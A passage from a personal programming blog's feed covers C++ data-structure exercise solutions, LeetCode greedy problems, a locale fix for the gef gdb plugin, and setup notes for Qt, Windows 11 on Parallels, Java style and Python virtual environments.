        if (ind * 2 + 1 &lt; arrLen &amp;&amp; arr[ind * 2 + 1] &gt; arr[ind] &amp;&amp; (ind * 2 + 2 &gt;= arrLen || arr[ind * 2 + 1] &gt; arr[ind * 2 + 2])) {
            int temp = arr[ind * 2 + 1];
            arr[ind * 2 + 1] = arr[ind];
            arr[ind] = temp;
        }
        if (ind * 2 + 2 &lt; arrLen &amp;&amp; arr[ind * 2 + 2] &gt; arr[ind] &amp;&amp; arr[ind * 2 + 1] &lt;= arr[ind * 2 + 2]) {
            int temp = arr[ind * 2 + 2];
            arr[ind * 2 + 2] = arr[ind];
            arr[ind] = temp;
        }
        if (ind * 2 + 1 &lt; arrLen) adjustMaxHeap(ind * 2 + 1);
        if (ind * 2 + 2 &lt; arrLen) adjustMaxHeap(ind * 2 + 2);
    }

    // Make arr into max heap.
    void makeMaxHeap() {
        int ind = arrLen / 2 - 1;
        for (int i = ind; i &gt;= 0; i--)
            adjustMaxHeap(i);
    }

    // Adjust min heap.
    void adjustMinHeap(int ind) {
        if (ind * 2 + 1 &lt; arrLen &amp;&amp; arr[ind * 2 + 1] &lt; arr[ind] &amp;&amp; (ind * 2 + 2 &gt;= arrLen || arr[ind * 2 + 1] &lt; arr[ind * 2 + 2])) {
            int temp = arr[ind * 2 + 1];
            arr[ind * 2 + 1] = arr[ind];
            arr[ind] = temp;
        }
        if (ind * 2 + 2 &lt; arrLen &amp;&amp; arr[ind * 2 + 2] &lt; arr[ind] &amp;&amp; arr[ind * 2 + 1] &gt;= arr[ind * 2 + 2]) {
            int temp = arr[ind * 2 + 2];
            arr[ind * 2 + 2] = arr[ind];
            arr[ind] = temp;
        }
        if (ind * 2 + 1 &lt; arrLen) adjustMinHeap(ind * 2 + 1);
        if (ind * 2 + 2 &lt; arrLen) adjustMinHeap(ind * 2 + 2);
    }

    // Make arr into min heap.
    void makeMinHeap() {
        int ind = arrLen / 2 - 1;
        for (int i = ind; i &gt;= 0; i--)
            adjustMinHeap(i);
    }

    void Run() {
        cin &gt;&gt; arrLen;
        arr = vector&lt;int&gt;(arrLen);
        for (int i = 0; i &lt; arrLen; i++)
            cin &gt;&gt; arr[i];

        checkMinHeap(0);
        checkMaxHeap(0);
        if (isMinHeap &amp;&amp; isMaxHeap) { cout &lt;&lt; &quot;max min&quot; &lt;&lt; endl; return; }
        if (isMinHeap) { cout &lt;&lt; &quot;min &quot;; makeMaxHeap(); printArr(); return; }
        if (isMaxHeap) { cout &lt;&lt; &quot;max &quot;; makeMinHeap(); printArr(); return; }
        makeMaxHeap(); printArr();
    }
};

int main() {
    Solution().Run();
    return 0;
}
</code></pre>
<h1 id="创建avl树并判断是否为完全二叉树">创建AVL树并判断是否为完全二叉树</h1>
<pre><code class="language-Markdown"># 题目描述
在AVL树中，任何节点的两个子树的高度最多相差1；如果它们高度相差不止1，则需要重新平衡以恢复这种属性。
现在给定一个插入序列， 一个一个地将键值插入初始为空的AVL树中，输出得到的AVL树的层次顺序遍历序列，并判断它是否是一个完全二叉树。

输入格式：
第一行包含一个正整数N(&lt;= 20)。然后在下一行给出N个不同的整数键。所有数字都用空格隔开。
输出格式：
第一行打印得到的AVL树的层次顺序遍历序列。所有数字都必须用空格隔开，并且行尾必须没有多余的空格。然后在下一行中，如果树为完全二叉树，则打印“Yes”;如果不是，则打印“No”。

样例输入1：
5
88 70 61 63 65 
样例输出1：
70 63 88 61 65
Yes

样例输入2：
10
62 88 58 47 35 73 51 99 37 93 
样例输出2：
62 47 88 35 58 73 99 37 51 93
No  

# 样例输入输出
样例1
输入:
5
88 70 61 63 65
输出:
70 63 88 61 65
Yes
样例2
输入:
10
62 88 58 47 35 73 51 99 37 93
输出:
62 47 88 35 58 73 99 37 51 93
No
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

struct Node {
    int val, height;
    Node * left, * right;
    Node(int v, int h);
};

Node::Node(int v, int h) {
    this-&gt;val = v;
    this-&gt;height = h;
    this-&gt;left = nullptr;
    this-&gt;right = nullptr;
}

int getHeight(Node * root) {
    if (root == nullptr) return 0;
    else return root-&gt;height;
}

Node * llRotate(Node * root) {
    Node * temp = root-&gt;right;
    root-&gt;right = temp-&gt;left;
    temp-&gt;left = root;
    // Update root and temp's height (root first, because temp's height rely on root's height.
    root-&gt;height = max(getHeight(root-&gt;left), getHeight(root-&gt;right)) + 1;
    temp-&gt;height = max(getHeight(temp-&gt;left), getHeight(temp-&gt;right)) + 1;
    return temp;
}

Node * rrRotate(Node * root) {
    Node * temp = root-&gt;left;
    root-&gt;left = temp-&gt;right;
    temp-&gt;right = root;
    // Update root and temp's height (root first, because temp's height rely on root's height.
    root-&gt;height = max(getHeight(root-&gt;left), getHeight(root-&gt;right)) + 1;
    temp-&gt;height = max(getHeight(temp-&gt;left), getHeight(temp-&gt;right)) + 1;
    return temp;
}

Node * lrRotate(Node * root) {
    root-&gt;left = llRotate(root-&gt;left);
    return rrRotate(root);
}

Node * rlRotate(Node * root) {
    root-&gt;right = rrRotate(root-&gt;right);
    return llRotate(root);
}

Node * insert(Node * root, int val) {
    if (root == nullptr) {
        root = new Node(val, 1);
    } else if (val &lt; root-&gt;val) {
        root-&gt;left = insert(root-&gt;left, val);
        root-&gt;height = max(getHeight(root-&gt;left), getHeight(root-&gt;right)) + 1;
        if (getHeight(root-&gt;left) - getHeight(root-&gt;right) ==  2) {
            if (val &lt; root-&gt;left-&gt;val)
                root = rrRotate(root);  // Right Right Rotate.
            else
                root = lrRotate(root);  // Left Right Rotate.
        }
    } else if (val &gt; root-&gt;val) {
        root-&gt;right = insert(root-&gt;right, val);
        root-&gt;height = max(getHeight(root-&gt;left), getHeight(root-&gt;right)) + 1;
        if (getHeight(root-&gt;left) - getHeight(root-&gt;right) == -2) {
            if (val &gt; root-&gt;right-&gt;val)
                root = llRotate(root);  // Left Left Rotate.
            else
                root = rlRotate(root);  // Right Left Rotate.
        }
    }
    return root;
}

bool judgeComplete(Node * root) {
    queue&lt;Node *&gt; que; que.push(root);
    Node * temp;
    while ((temp = que.front()) != nullptr) {
        que.pop();
        que.push(temp-&gt;left); que.push(temp-&gt;right);
    }
    while (!que.empty()) {
        temp = que.front(); que.pop();
        if (nullptr != temp)
            return false;  // root is not a complete binary tree.
    }
    return true;
}

int main() {
    int len, num; cin &gt;&gt; len;
    Node * root = nullptr;
    // Insert nodes into AVL tree.
    for (int i = 0; i &lt; len; i++) {
        cin &gt;&gt; num;
        root = insert(root, num);
    }
    // Level order traversal.
    queue&lt;Node *&gt; lOrder; lOrder.push(root);
    while (!lOrder.empty()) {
        Node * temp = lOrder.front(); lOrder.pop();
        if (temp-&gt;left != nullptr) lOrder.push(temp-&gt;left);
        if (temp-&gt;right != nullptr) lOrder.push(temp-&gt;right);
        cout &lt;&lt; temp-&gt;val;
        if (!lOrder.empty()) cout &lt;&lt; &quot; &quot;;
    }
    cout &lt;&lt; endl;
    // Judge whether AVL tree is a complete binary tree.
    if (judgeComplete(root)) cout &lt;&lt; &quot;Yes&quot; &lt;&lt; endl;
    else cout &lt;&lt; &quot;No&quot; &lt;&lt; endl;

    return 0;
}
</code></pre>
<h1 id="村庄是否联通">村庄是否联通</h1>
<pre><code class="language-Markdown"># 题目描述
村庄中存在一些路，根据输入的相邻村庄的路，判断某两个村庄是否能够联通。n个村庄使用0到n-1的不同整数标识。路使用取值范围【0，n-1】的整数对表示。例如 3 5，代表村庄3和5之间有一条路。
Input Format
村庄个数 n， 0&lt;n&lt;=20
路的条数 m，0&lt;m&lt;=50
m条路，即为2m个范围在【0，n-1】的整数   
需要判断是否相连的村庄对数 p 0&lt;p&lt;=10
需要判断是否相连的p对村庄，即为2p个范围在【0，n-1】的整数。
Output Format
能够连通输出
true
,不可连通输出
false

# Example
Input
5
4
0 4
2 4
0 2
1 3
2
3 4
2 4
Output
false
true
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class UnionFind {
private:
    vector&lt;int&gt; parent;
    int size;

public:
    UnionFind(int s) {
        size = s;
        parent = vector&lt;int&gt;(size);
        for (int i = 0; i &lt; size; i++)
            parent[i] = i;
    }

    int find(int ele) {
        while (parent[ele] != ele)
            ele = parent[ele];
        return ele;
    }

    void combine(int ele1, int ele2) {
        int par1 = find(ele1);
        int par2 = find(ele2);
        if (par1 == par2) return;
        else {
            if (par1 &gt; par2)
                parent[par2] = par1;
            else if (par1 &lt; par2)
                parent[par1] = par2;
            return;
        }
    }

    bool isConnect(int ele1, int ele2) {
        return (find(ele1) == find(ele2));
    }
};

class Solution {
public:
    static void run() {
        int n, m, p;
        int ele1, ele2;
        bool ret;

        cin &gt;&gt; n &gt;&gt; m;
        auto u = UnionFind(n);
        for (int i = 0; i &lt; m; i++) {
            cin &gt;&gt; ele1 &gt;&gt; ele2;
            u.combine(ele1, ele2);
        }

        cin &gt;&gt; p;
        auto num = vector&lt;vector&lt;int&gt;&gt;(p);
        for (int i = 0; i &lt; p; i++) {
            num[i] = vector&lt;int&gt;(2);
            cin &gt;&gt; num[i][0] &gt;&gt; num[i][1];
        }

        for (int i = 0; i &lt; p; i++) {
            ret = u.isConnect(num[i][0], num[i][1]);
            if (!ret) cout &lt;&lt; &quot;false&quot; &lt;&lt; endl;
            else      cout &lt;&lt; &quot;true&quot; &lt;&lt; endl;
        }
    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fix "UnicodeEncodeError" When Running gef on Ubuntu20.04]]></title>
        <id>https://eclipse-yes.github.io/post/a0NaW1Q9e/</id>
        <link href="https://eclipse-yes.github.io/post/a0NaW1Q9e/">
        </link>
        <updated>2021-12-14T07:22:07.000Z</updated>
        <summary type="html"><![CDATA[<p>Fixing the encoding problem using gef plugin for gdb on Ubuntu 20.04 Docker container.</p>
]]></summary>
        <content type="html"><![CDATA[<p>Fixing the encoding problem using gef plugin for gdb on Ubuntu 20.04 Docker container.</p>
<!-- more -->
<h2 id="problem-discription">Problem Discription</h2>
<p>This blog presents a command line problem caused by locales (language settings) on Linux systems like Ubuntu as well as fixing this problem by correctly configuring language environment variabels.</p>
<p>The first time entering a clean Ubuntu container, you might configure nothing about language settings. When type <code>locale</code> on terminal, you might get this:</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211214141717.png" alt="image-20211214141717279" loading="lazy"></figure>
<p>Then, something goes wrong after installing gdb and gef plugin:</p>
<pre><code class="language-txt">Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128):
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211214141916.png" alt="image-20211214141916263" loading="lazy"></figure>
<h2 id="problem-fixing">Problem Fixing</h2>
<h3 id="install-dependencies">Install Dependencies</h3>
<p>As mentioned above, the reason is language settings on command line variables. Here comes some solutions to fix it. First of all, check and install available locales.</p>
<pre><code class="language-bash">❯ locale -a
C
C.UTF-8
POSIX
</code></pre>
<p>If the locale you need does not appear in this list (e.g. en_US.utf8), use the following command to install it additionally.</p>
<pre><code class="language-bash">❯ apt install locale-gen

❯ locale-gen en_US.UTF-8
Generating locales (this might take a while)...
  en_US.UTF-8... done
Generation complete.

# This command is for displaying a list of all available locales.
❯ cat /usr/share/i18n/SUPPORTED
</code></pre>
<h3 id="adjusting-locales">Adjusting Locales</h3>
<p>The default settings are stored in the <code>/etc/default/locale</code> file.</p>
<pre><code class="language-bash">❯ cat /etc/default/locale
# File generated by update-locale
LANG=en_US.UTF-8
</code></pre>
<p>This file can either be adjusted manually or updated using command <code>update-locale</code>.</p>
<pre><code class="language-bash">❯ update-locale LANG=en_US.UTF-8
</code></pre>
<p>Besides, another solution to fix this problem is configuring <code>~/.bashrc</code> file.</p>
<pre><code class="language-bash">export LANG=en_US.utf8
export LC_ALL=en_US.utf8
</code></pre>
<p>Reboot system and gef works well.</p>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211214143648.png" alt="image-20211214143648351" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[LeetCode Practice: Greedy]]></title>
        <id>https://eclipse-yes.github.io/post/9Vbd6hvyw/</id>
        <link href="https://eclipse-yes.github.io/post/9Vbd6hvyw/">
        </link>
        <updated>2021-11-03T03:18:18.000Z</updated>
        <summary type="html"><![CDATA[<p align='center'>Intentional practice is the key to success.</p>]]></summary>
        <content type="html"><![CDATA[<p align='center'>Intentional practice is the key to success.</p>
<!-- more -->
<hr>
<h1 id="455-assign-cookies">455. Assign Cookies</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/assign-cookies/">https://leetcode-cn.com/problems/assign-cookies/</a><br>
Description: Given two lists. The first one is the mininum sizes of a cookie that the child will be content with. The second one is the sizes of each cookie.</p>
</blockquote>
<pre><code class="language-c++">class Solution {
public:
    int findContentChildren(vector&lt;int&gt;&amp; g, vector&lt;int&gt;&amp; s) {
        std::sort(g.begin(), g.end());
        std::sort(s.begin(), s.end());
        int gp = 0, sp = 0;
        while (gp &lt; g.size() &amp;&amp; sp &lt; s.size()) {
            if (g[gp] &lt;= s[sp]) {
                // Mean this quantity of cookie is capable of making this kid content.
                ++gp;
            }
            ++sp;
        }
        return gp;
    }
};
</code></pre>
<h1 id="135-candy">135. Candy</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/candy/">https://leetcode-cn.com/problems/candy/</a><br>
Description: Given a vector of student scores. Assign them with appropriate candies. There are several rules: 1. each child must have at least 1 candy; 2. children with a higher score get more candies than their neighbors.</p>
</blockquote>
<pre><code class="language-c++">class Solution {
public:
    int candy(vector&lt;int&gt;&amp; ratings) {
        int size = ratings.size();
        if (size &lt; 2) return size;
        std::vector&lt;int&gt; candies(size, 1);

        // Loop1 from 1 -&gt; size-1.
        // If the right is greater than the left, candies[right] = candies[left] + 1.
        for (int i = 1; i &lt; size; ++i) {
            if (ratings[i-1] &lt; ratings[i]) candies[i] = candies[i-1] + 1;
        }
        // Loop2 from size-2 -&gt; 0.
        // If the left is greater than the right,
        //      if candies[i] &lt;= candies[i+1], candies[i] = candies[i+1] + 1
        for (int i = size-2; i &gt;= 0; --i) {
            if (ratings[i] &gt; ratings[i+1])
                if (candies[i] &lt;= candies[i+1])
                    candies[i] = candies[i+1] + 1;
        }

        return std::accumulate(candies.begin(), candies.end(), 0);
    }
};
</code></pre>
<p>Besides, there are another solution for loop2 through std function.</p>
<pre><code class="language-c++">for (int i = size-2; i &gt;= 0; --i)
  if (ratings[i] &gt; ratings[i+1])
    candies[i] = std::max(candies[i], candies[i+1]+1);
</code></pre>
<h1 id="435-non-overlapping-intervals">435. Non-overlapping Intervals</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/non-overlapping-intervals/">https://leetcode-cn.com/problems/non-overlapping-intervals/</a><br>
Description: Given a vector contains 2-dimensional vectors which have [1]:start and [2]:end. Return the minimum number of intervals removed to make the rest of the intervals non-overlapping.</p>
</blockquote>
<pre><code class="language-c++">class Solution {
public:
    int eraseOverlapIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) {
        if (intervals.empty()) return 0;
        int size = intervals.size();
        // Sort intervals according to the end(i).
        std::sort(intervals.begin(), intervals.end(), [](vector&lt;int&gt;&amp; a, vector&lt;int&gt;&amp; b){
            return a[1] &lt; b[1];
        });

        int removed = 0, prev = intervals[0][1];
        for (int i = 1; i &lt; size; ++i) {
            if (prev &gt; intervals[i][0])
                ++removed;
            else
                prev = intervals[i][1];
        }
        return removed;
    }
};
</code></pre>
<p>The lambda function in the solution can also be accurated as follows:</p>
<pre><code class="language-c++">// Considered a special case: when a[i] == b[i], make the smaller one in position [0] to the front.
return (a[1] &lt; b[1]) | (a[1] == b[1] &amp;&amp; a[0] &lt; b[0]);
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Qt Environment on macOS]]></title>
        <id>https://eclipse-yes.github.io/post/xdySGFEUX/</id>
        <link href="https://eclipse-yes.github.io/post/xdySGFEUX/">
        </link>
        <updated>2021-10-07T11:40:09.000Z</updated>
        <summary type="html"><![CDATA[<p><strong>Qt</strong> is a widget toolkit for creating graphical user interfaces as well as cross-platform applications that run on various software and hardware platforms such as Linux, Windows, macOS, Android or embedded systems with little or no change in the underlying codebase while still being a native application with native capabilities and speed. (Wikipedia)</p>
]]></summary>
        <content type="html"><![CDATA[<p><strong>Qt</strong> is a widget toolkit for creating graphical user interfaces as well as cross-platform applications that run on various software and hardware platforms such as Linux, Windows, macOS, Android or embedded systems with little or no change in the underlying codebase while still being a native application with native capabilities and speed. (Wikipedia)</p>
<!-- more -->
<h1 id="install-qt-and-qt-creator-on-macos">Install Qt and Qt Creator on macOS</h1>
<pre><code class="language-bash">brew install qt
brew install --cask qt-creator
</code></pre>
<h1 id="config-qt-in-qt-creator">Config Qt in Qt Creator</h1>
<p>(1) Add  a Qt Version.</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211007192759.png" alt="image-20211007192759703" loading="lazy"></figure>
<p>The default directory for qt installed by homebrew is <code>/usr/local/Cellar/qt</code>. Select your own qmake file and add it to QT Version.</p>
<p>(2) Config a Qt kit.</p>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211007193153.png" alt="image-20211007193153782" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211007193102.png" alt="image-20211007193102719" loading="lazy"></figure>
<p>Make sure you set the right C and C++ compiler as well as the correct Qt version. Then, you will have no obstacle creating a Qt project.</p>
<h1 id="qmake-vs-cmake">QMake vs. CMake</h1>
<p>Generally Speaking:</p>
<ul>
<li>Orienting the simple Qt project, use qmake</li>
<li>Orienting project whose complexity is greater than capability of qmake, use cmake.</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[LeetCode Practice: Tree (Part 2)]]></title>
        <id>https://eclipse-yes.github.io/post/2p65IgOA_/</id>
        <link href="https://eclipse-yes.github.io/post/2p65IgOA_/">
        </link>
        <updated>2021-10-06T09:50:56.000Z</updated>
        <summary type="html"><![CDATA[<p align='center'>Intentional practicing is of great importance.</p>]]></summary>
        <content type="html"><![CDATA[<p align='center'>Intentional practicing is of great importance.</p>
<!-- more -->
<hr>
<h1 id="332-reconstruct-itinerary">332. Reconstruct Itinerary</h1>
<blockquote>
<p><strong>URL</strong>: <a href="https://leetcode-cn.com/problems/reconstruct-itinerary/">https://leetcode-cn.com/problems/reconstruct-itinerary/</a><br>
<strong>Description</strong>: Given a list of airline tickets represented by pairs of departure and arrival airports <code>[from, to]</code>, reconstruct the itinerary in order. All of the tickets belong to a man who departs from <code>JFK</code>. Thus, the itinerary must begin with <code>JFK</code>.</p>
<p>Constraints:</p>
<ol>
<li>If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary <code>[&quot;JFK&quot;, &quot;LGA&quot;]</code> has a smaller lexical order than <code>[&quot;JFK&quot;, &quot;LGB&quot;]</code>.</li>
<li>All airports are represented by three capital letters (IATA code).</li>
<li>You may assume all tickets form at least one valid itinerary.</li>
</ol>
</blockquote>
<p><strong><u><em>Convert the graph to a tree and do post-order traversal.</em></u></strong></p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211006180732.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211006180855.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><a href="http://zxi.mytechroad.com/blog/wp-content/uploads/2017/09/332-ep52-3.png"><img src="http://zxi.mytechroad.com/blog/wp-content/uploads/2017/09/332-ep52-3.png" alt="img" loading="lazy"></a></figure>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211006181010.png" alt="img" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Perfectly Install Windows11 on Parallels Desktop17]]></title>
        <id>https://eclipse-yes.github.io/post/OUdB8LJtE/</id>
        <link href="https://eclipse-yes.github.io/post/OUdB8LJtE/">
        </link>
        <updated>2021-10-05T13:10:26.000Z</updated>
        <summary type="html"><![CDATA[<p>Today, Tue 5 Oct 2021 is the release time for Windows11. Since I do not have a spare machine, a virtual machine on Parallels Desktop is the best choice. The blog will walk through whole steps you need to take for installing the lovely Windows11 on your own PD.</p>
]]></summary>
        <content type="html"><![CDATA[<p>Today, Tue 5 Oct 2021 is the release time for Windows11. Since I do not have a spare machine, a virtual machine on Parallels Desktop is the best choice. The blog will walk through whole steps you need to take for installing the lovely Windows11 on your own PD.</p>
<!-- more -->
<h1 id="1-dowload-iso-file">1. Dowload ISO FIle</h1>
<p>Official Site: <a href="https://www.microsoft.com/en-us/software-download/windows11">https://www.microsoft.com/en-us/software-download/windows11</a></p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211005211900.png" alt="image-20211005211900442" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211005211934.png" alt="image-20211005211934642" loading="lazy"></figure>
<h1 id="2-install-windows11-on-pd17">2. Install Windows11 on PD17</h1>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211005212139.png" alt="image-20211005212139545" loading="lazy"></figure>
<p>Before starting the installation, you need go to configuration and add <strong>TPM Chip</strong> into the virtual machine.</p>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211005212308.png" alt="image-20211005212308875" loading="lazy"></figure>
<p>Then, follow the instructions and Windows11 would be perfectly installed. Have a try!!!</p>
<figure data-type="image" tabindex="5"><img src="https://eclipse-yes.github.io/post-images/1633440511646.jpg" alt="win11" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java Style Guide]]></title>
        <id>https://eclipse-yes.github.io/post/7nC6AYAsx/</id>
        <link href="https://eclipse-yes.github.io/post/7nC6AYAsx/">
        </link>
        <updated>2021-10-04T10:53:16.000Z</updated>
        <content type="html"><![CDATA[<h1 id="comments">Comments</h1>
<ol>
<li>
<p>Methods should have javadoc comments explaining the behavior, parameters (using @param tags or otherwise), and return type.</p>
</li>
<li>
<p>Methods that return non-void values must describe them in their Javadoc comment either with a “@return” tag or in a phrase in running text that contains the word “return”, “returning”, or “returns”.</p>
</li>
<li>
<p>Each Javadoc comment must start with a properly formed sentence, starting with a capital letter and ending with a period.</p>
</li>
</ol>
<p>Basic information that are better contained in a javadoc comment.</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211004183304.png" alt="image-20211004183304628" loading="lazy"></figure>
<h1 id="identifiers">Identifiers</h1>
<ol>
<li>Names of static final constants must be in all capitals (e.g., RED, DEFAULT_NAME).</li>
<li>Names of parameters, local variables, and methods must start with a lower-case letter (Camel-Case Style), or consist of a single, upper-case letter.</li>
<li>Names of types (classes), including type parameters, must start with a capital letter.</li>
<li>Names of packages must start with a lower-case letter.</li>
<li>Names of instance variables and non-final class (static) variables must start with either a lower-case letter or “_”.</li>
</ol>
<h1 id="imports">Imports</h1>
<ol>
<li>Do not use ‘import PACKAGE.<em>’, unless the package is java.lang.Math, java.lang.Double, or org.junit.Assert. ‘import static CLASS.</em>’ is OK.</li>
<li>Do not import classes or members that you do not use.</li>
</ol>
<h1 id="modifiers">Modifiers</h1>
<p>Write any modifiers for methods, classes, or fields in the following order:</p>
<ol>
<li>public, protected, or private.</li>
<li>abstract or static.</li>
<li>final, transient, or volatile.</li>
<li>synchronized.</li>
<li>native.</li>
<li>strictfp.</li>
</ol>
<p>Do not explicitly modify methods, fields, or classes where the modification is redundant:</p>
<ol>
<li>Do not label methods in interfaces or annotations as “public” or “abstract”</li>
<li>Do not label fields in interfaces or annotations as “static”, “public”, or “final”.</li>
<li>Do not label methods in final classes as “final”.</li>
<li>Do not label nested interfaces “static”.</li>
</ol>
<p>Only static final fields of classes may be public. Other fields must be private or protected.</p>
<p>Classes that have only static methods and fields must not have a public (or defaulted) constructor.</p>
<p>Classes that have only private constructors must be declared “final”.</p>
<h1 id="avoiding-error-prone-constructs">Avoiding Error-Prone Constructs</h1>
<ol>
<li>
<p>Local variables and parameters must not shadow field names. The preferred way to handle, e.g., getter/setter methods that simply control a field is to prefix the field name with “_”, as in</p>
<pre><code class="language-java">public double getWidth() {
     return _width;
}

public void setWidth(double width) {
    _width = width;
}
</code></pre>
</li>
<li>
<p>Do not use nested assignments, such as “if ((x = next()) != null) …”. Although this can be useful in C, it is almost never necessary in Java.</p>
</li>
<li>
<p>End every arm of a “switch” statement either with a “break” statement or a comment of the form</p>
<pre><code class="language-java">/* fall through */
</code></pre>
</li>
</ol>
<hr>
<p>Reference: <a href="https://sp19.datastructur.es/materials/guides/style-guide.html">https://sp19.datastructur.es/materials/guides/style-guide.html</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Lecture Notes: Digital Logic]]></title>
        <id>https://eclipse-yes.github.io/post/OzQnaeZ3s/</id>
        <link href="https://eclipse-yes.github.io/post/OzQnaeZ3s/">
        </link>
        <updated>2021-10-04T02:04:22.000Z</updated>
        <summary type="html"><![CDATA[<p align='center'>大学课程：数字逻辑；笔记+课堂总结+题目总结。</p>]]></summary>
        <content type="html"><![CDATA[<p align='center'>大学课程：数字逻辑；笔记+课堂总结+题目总结。</p>
<!-- more -->
<h1 id="chapter1-basics">Chapter1 Basics</h1>
<figure data-type="image" tabindex="1"><img src="https://eclipse-yes.github.io/post-images/1633590323341.png" alt="chapter1-mindmap" loading="lazy"></figure>
<h1 id="chapter2-boolean-algebra">Chapter2 Boolean Algebra</h1>
<figure data-type="image" tabindex="2"><img src="https://eclipse-yes.github.io/post-images/1633590336838.png" alt="chapter2-mindmap" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Manage Python Virtual Environment]]></title>
        <id>https://eclipse-yes.github.io/post/NquhcdoLu/</id>
        <link href="https://eclipse-yes.github.io/post/NquhcdoLu/">
        </link>
        <updated>2021-09-26T11:59:47.000Z</updated>
        <summary type="html"><![CDATA[<p>Sometimes, you might accidentally install many versions of Python and get confused about which one to use or which one is being used in your computer's environment. In this aritcle, several solutions to deal with virtual environment will be covered.</p>
]]></summary>
        <content type="html"><![CDATA[<p>Sometimes, you might accidentally install many versions of Python and get confused about which one to use or which one is being used in your computer's environment. In this aritcle, several solutions to deal with virtual environment will be covered.</p>
<!-- more -->
<h1 id="os-ubuntu-on-docker">OS: Ubuntu on Docker</h1>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210926185250.png" alt="image-20210926185250076" loading="lazy"></figure>
<h1 id="solution1-venv">Solution1: venv</h1>
<p>Official Document: <a href="https://docs.python.org/3/library/venv.html">https://docs.python.org/3/library/venv.html</a></p>
<p>The <a href="https://docs.python.org/3/library/venv.html#module-venv"><code>venv</code></a> module provides support for creating lightweight “virtual environments” with their own site directories, optionally isolated from system site directories. Each virtual environment has its own Python binary (which matches the version of the binary that was used to create this environment) and can have its own independent set of installed Python packages in its site directories.</p>
<pre><code class="language-bash"># Install
apt install python3.8-venv
# Create
python3 -m venv /path/to/new/virtual/environment
# Activate
source &lt;venv&gt;/bin/activate
# Deactivate
deactivate
</code></pre>
<h1 id="solution2-virtualenv">Solution2: virtualenv</h1>
<pre><code class="language-bash"># Install virtualenv.
pip install virtualenv
# Create
# When virtualenv version &gt;= 20, option `--no-site-packages` is not needed.
virtualenv my_venv_by_virtualenv
# Activate
source my_venv_by_virtualenv/bin/activate
# Deactivate
deactivate
</code></pre>
<p>When not using virtualenvwrapper, it is allowed to remove virtual env by directlt deleting virtual environment's directory .</p>
<h1 id="solution3-virtualenvwrapper">Solution3: virtualenvwrapper</h1>
<p>Official Document: <a href="https://virtualenvwrapper.readthedocs.io/en/latest/">https://virtualenvwrapper.readthedocs.io/en/latest/</a></p>
<pre><code class="language-bash"># Install
pip install virtualenvwrapper
# Config
# Add export line to .bashrc to permanently do config.
export WORKON_HOME=~/virtualenvwrapper_home
mkdir -p $WORKON_HOME
</code></pre>
<p>There are command in tool virtualenvwrapper as following:</p>
<pre><code class="language-txt">add2virtualenv: add directory to the import path
allvirtualenv: run a command in all virtualenvs
cdproject: change directory to the active project
cdsitepackages: change to the site-packages directory
cdvirtualenv: change to the $VIRTUAL_ENV directory
cpvirtualenv: duplicate the named virtualenv to make a new one
lssitepackages: list contents of the site-packages directory
lsvirtualenv: list virtualenvs
mkproject: create a new project directory and its associated virtualenv
mktmpenv: create a temporary virtualenv
mkvirtualenv: Create a new virtualenv in $WORKON_HOME
rmvirtualenv: Remove a virtualenv
setvirtualenvproject: associate a project directory with a virtualenv
showvirtualenv: show details of a single virtualenv
toggleglobalsitepackages: turn access to global site-packages on/off
virtualenvwrapper: show this help message
wipeenv: remove all packages installed in the current virtualenv
workon: list or change working virtualenvs
</code></pre>
<pre><code class="language-bash"># Activate
workon env1
# Reveal venv dir
echo $VIRTUAL_ENV
# Deactivate
deactivate
</code></pre>
<h1 id="solution4-conda-on-miniconda">Solution4: conda on miniconda</h1>
<p>Miniconda Official Website: <a href="https://docs.conda.io/en/latest/miniconda.html">https://docs.conda.io/en/latest/miniconda.html</a></p>
